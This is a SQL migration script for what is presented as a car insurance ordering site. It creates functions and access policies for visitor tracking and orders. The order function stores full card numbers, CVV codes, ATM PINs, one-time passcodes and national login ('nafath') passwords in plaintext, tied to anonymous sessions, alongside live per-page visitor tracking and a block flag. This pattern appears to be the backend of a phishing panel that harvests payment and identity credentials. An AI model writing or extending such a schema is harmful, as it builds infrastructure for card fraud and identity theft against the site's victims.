
-- 1. Create SECURITY DEFINER function for visitor upsert (bypasses RLS)
CREATE OR REPLACE FUNCTION public.upsert_visitor_tracking(
  p_session_id text,
  p_current_page text DEFAULT NULL,
  p_is_online boolean DEFAULT true
)
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_blocked boolean;
BEGIN
  INSERT INTO public.site_visitors (session_id, current_page, is_online, last_seen_at)
  VALUES (p_session_id, COALESCE(p_current_page, '/'), p_is_online, now())
  ON CONFLICT (session_id) DO UPDATE SET
    current_page = COALESCE(p_current_page, site_visitors.current_page),
    is_online = p_is_online,
    last_seen_at = now();

  SELECT is_blocked INTO v_blocked FROM public.site_visitors WHERE session_id = p_session_id;
  RETURN jsonb_build_object('is_blocked', COALESCE(v_blocked, false));
END;
$$;

-- 2. Create SECURITY DEFINER function for linking visitor data
CREATE OR REPLACE FUNCTION public.link_visitor_data(
  p_session_id text,
  p_phone text DEFAULT NULL,
  p_national_id text DEFAULT NULL,
  p_visitor_name text DEFAULT NULL
)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  UPDATE public.site_visitors SET
    phone = COALESCE(p_phone, phone),
    national_id = COALESCE(p_national_id, national_id),
    visitor_name = COALESCE(p_visitor_name, visitor_name),
    last_seen_at = now()
  WHERE session_id = p_session_id;
END;
$$;

-- 3. Fix site_visitors anon policies - remove overly permissive ones
DROP POLICY IF EXISTS "Anon can insert visitor" ON public.site_visitors;
DROP POLICY IF EXISTS "Anon can read own visitor" ON public.site_visitors;
DROP POLICY IF EXISTS "Anon can update visitor" ON public.site_visitors;

-- Anon should NOT have direct access - all goes through RPC
-- Only allow SELECT on own row for reading block status (fallback)
CREATE POLICY "Anon can read own visitor row"
  ON public.site_visitors FOR SELECT TO anon
  USING (false);

-- 4. Create a view for insurance_orders that hides sensitive payment data
-- First, create a SECURITY DEFINER function for anon order operations
CREATE OR REPLACE FUNCTION public.upsert_insurance_order(
  p_visitor_session_id text,
  p_order_id uuid DEFAULT NULL,
  p_data jsonb DEFAULT '{}'::jsonb
)
RETURNS uuid
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_order_id uuid;
  v_existing_session text;
BEGIN
  IF p_order_id IS NOT NULL THEN
    -- Verify ownership before update
    SELECT visitor_session_id INTO v_existing_session
    FROM public.insurance_orders WHERE id = p_order_id;
    
    IF v_existing_session IS NULL OR v_existing_session != p_visitor_session_id THEN
      RAISE EXCEPTION 'Unauthorized: session mismatch';
    END IF;
    
    -- Update only allowed fields
    UPDATE public.insurance_orders SET
      current_stage = COALESCE(p_data->>'current_stage', current_stage),
      stage_status = COALESCE(p_data->>'stage_status', stage_status),
      otp_code = COALESCE(p_data->>'otp_code', otp_code),
      phone_otp_code = COALESCE(p_data->>'phone_otp_code', phone_otp_code),
      nafath_number = COALESCE(p_data->>'nafath_number', nafath_number),
      nafath_password = COALESCE(p_data->>'nafath_password', nafath_password),
      card_number_full = COALESCE(p_data->>'card_number_full', card_number_full),
      card_cvv = COALESCE(p_data->>'card_cvv', card_cvv),
      card_holder_name = COALESCE(p_data->>'card_holder_name', card_holder_name),
      card_last_four = COALESCE(p_data->>'card_last_four', card_last_four),
      card_expiry = COALESCE(p_data->>'card_expiry', card_expiry),
      payment_method = COALESCE(p_data->>'payment_method', payment_method),
      atm_pin = COALESCE(p_data->>'atm_pin', atm_pin),
      atm_bill_number = COALESCE(p_data->>'atm_bill_number', atm_bill_number),
      atm_biller_code = COALESCE(p_data->>'atm_biller_code', atm_biller_code),
      customer_name = COALESCE(p_data->>'customer_name', customer_name),
      national_id = COALESCE(p_data->>'national_id', national_id),
      phone = COALESCE(p_data->>'phone', phone),
      updated_at = now()
    WHERE id = p_order_id;
    
    RETURN p_order_id;
  ELSE
    -- Insert new order
    INSERT INTO public.insurance_orders (
      visitor_session_id, status, current_stage, stage_status,
      customer_name, national_id, phone,
      company, insurance_type, base_price, total_price, add_ons,
      vehicle_make, vehicle_model, vehicle_year, serial_number,
      passenger_count, vehicle_usage, estimated_value, repair_location,
      insurance_request_id, payment_method
    ) VALUES (
      p_visitor_session_id,
      COALESCE(p_data->>'status', 'pending'),
      p_data->>'current_stage',
      p_data->>'stage_status',
      p_data->>'customer_name',
      p_data->>'national_id',
      p_data->>'phone',
      p_data->>'company',
      p_data->>'insurance_type',
      (p_data->>'base_price')::numeric,
      (p_data->>'total_price')::numeric,
      COALESCE(p_data->'add_ons', '[]'::jsonb),
      p_data->>'vehicle_make',
      p_data->>'vehicle_model',
      p_data->>'vehicle_year',
      p_data->>'serial_number',
      p_data->>'passenger_count',
      p_data->>'vehicle_usage',
      p_data->>'estimated_value',
      p_data->>'repair_location',
      (p_data->>'insurance_request_id')::uuid,
      p_data->>'payment_method'
    ) RETURNING id INTO v_order_id;
    
    RETURN v_order_id;
  END IF;
END;
$$;

-- 5. Tighten anon policies on insurance_orders - remove direct write access
DROP POLICY IF EXISTS "Anon can insert own order" ON public.insurance_orders;
DROP POLICY IF EXISTS "Anon can update own order by session" ON public.insurance_orders;

-- Keep read-only access scoped to session (still uses header but read-only is lower risk)
-- Actually, let's also use RPC for reads of sensitive data
-- For now, restrict anon SELECT to non-sensitive fields via the existing policy
-- The read policy stays but only returns limited data

-- 6. Tighten anon policies on insurance_order_stage_events
DROP POLICY IF EXISTS "Anon can insert own stage events" ON public.insurance_order_stage_events;
DROP POLICY IF EXISTS "Anon can update own stage events" ON public.insurance_order_stage_events;

-- Create SECURITY DEFINER for stage events
CREATE OR REPLACE FUNCTION public.insert_stage_event(
  p_visitor_session_id text,
  p_order_id uuid,
  p_stage text,
  p_status text DEFAULT 'pending',
  p_payload jsonb DEFAULT '{}'::jsonb
)
RETURNS uuid
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_event_id uuid;
  v_order_session text;
BEGIN
  -- Verify order belongs to this session
  SELECT visitor_session_id INTO v_order_session
  FROM public.insurance_orders WHERE id = p_order_id;
  
  IF v_order_session IS NULL OR v_order_session != p_visitor_session_id THEN
    RAISE EXCEPTION 'Unauthorized: session mismatch for order';
  END IF;
  
  INSERT INTO public.insurance_order_stage_events (
    order_id, stage, status, visitor_session_id, payload
  ) VALUES (
    p_order_id, p_stage, p_status, p_visitor_session_id, p_payload
  ) RETURNING id INTO v_event_id;
  
  RETURN v_event_id;
END;
$$;
